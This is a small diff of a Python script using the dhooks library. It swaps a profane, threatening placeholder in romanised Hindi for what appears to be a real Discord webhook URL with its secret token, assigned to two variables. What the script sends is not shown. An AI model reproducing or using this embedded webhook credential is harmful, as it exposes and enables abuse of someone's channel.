@@ -19,9 +19,9 @@ from dhooks import Webhook, Embed
 import aniso8601
 
 
-webhook_url="_webhook url daal mohit laude Agar script share hua na tera gand faad dunga_"
+webhook_url="https://discord.com/api/webhooks/958745428248133672/vIbh1DgwIuw6_YYkHhGPFhKIW7b609cylUOF1NGB0ez6Gru6LD0Ht5IUY9Ij6w_Ke4zL"
 
-we=""
+we="https://discord.com/api/webhooks/958745428248133672/vIbh1DgwIuw6_YYkHhGPFhKIW7b609cylUOF1NGB0ez6Gru6LD0Ht5IUY9Ij6w_Ke4zL"
 
 
 try:
